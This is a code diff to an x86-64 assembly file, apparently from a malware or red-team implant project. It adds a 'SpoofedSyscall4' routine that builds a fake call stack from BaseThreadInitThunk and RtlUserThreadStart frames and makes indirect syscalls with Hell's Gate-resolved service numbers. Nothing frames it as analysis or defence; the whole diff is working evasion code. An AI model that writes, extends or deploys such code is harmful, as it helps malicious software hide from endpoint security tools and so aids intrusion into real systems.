@@ -71,6 +71,7 @@ section .data
 section .text
     global HellsGateCall
     global SpoofedNtWait
+    global SpoofedSyscall4
 
 ; ─── HellsGateCall ───────────────────────────────────────────────────────────
 ; NTSTATUS HellsGateCall(arg1..arg8)
@@ -149,4 +150,54 @@ SpoofedNtWait:
     mov  eax, 0xC0000002
     ret
 .do_plain:
+    jmp  qword [rel g_gadget]
+
+; ─── SpoofedSyscall4 ─────────────────────────────────────────────────────────
+; NTSTATUS SpoofedSyscall4(PVOID a1, PVOID a2, PVOID a3, PVOID a4)
+; rcx=a1, rdx=a2, r8=a3, r9=a4  — all args fit in registers, no stack args.
+;
+; Builds the same 4-frame fake call stack as SpoofedNtWait.
+; SSN comes from g_ssn — caller sets it via HellsGateSetSSN() before calling.
+; Falls back to a plain indirect syscall if gadgets are not yet initialised.
+SpoofedSyscall4:
+    ; ── Check if gadgets are ready ────────────────────────────────────────────
+    mov  r10, qword [rel g_pivot]
+    test r10, r10
+    jz   .plain4
+    mov  r10, qword [rel g_btt]
+    test r10, r10
+    jz   .plain4
+    mov  r10, qword [rel g_rtl]
+    test r10, r10
+    jz   .plain4
+
+    ; ── Build fake frame chain (identical layout to SpoofedNtWait) ────────────
+    pop  r11              ; r11 = real_ret;  RSP → P+8
+    sub  rsp, 0x30        ; RSP → P-0x28
+
+    mov  rax, qword [rel g_pivot]
+    mov  qword [rsp+0x00], rax     ; [P-0x28]: cleanup gadget (frame 0)
+    mov  rax, qword [rel g_btt]
+    mov  qword [rsp+0x08], rax     ; [P-0x20]: BaseThreadInitThunk+N (frame 1)
+    mov  rax, qword [rel g_rtl]
+    mov  qword [rsp+0x10], rax     ; [P-0x18]: RtlUserThreadStart+K (frame 2)
+    xor  eax, eax
+    mov  qword [rsp+0x18], rax     ; [P-0x10]: 0 (above thread root)
+    mov  qword [rsp+0x20], rax     ; [P-0x08]: 0 (padding)
+    mov  qword [rsp+0x28], r11     ; [P+0x00]: real_ret (explicit, for safety)
+
+    ; ── Indirect syscall using g_ssn (set by caller via HellsGateSetSSN) ─────
+    mov  r10, rcx
+    mov  eax, dword [rel g_ssn]
+    jmp  qword [rel g_gadget]
+
+.plain4:
+    ; No gadgets — plain indirect syscall
+    mov  r10, rcx
+    mov  eax, dword [rel g_ssn]
+    test eax, eax
+    jnz  .do4
+    mov  eax, 0xC0000002
+    ret
+.do4:
     jmp  qword [rel g_gadget]
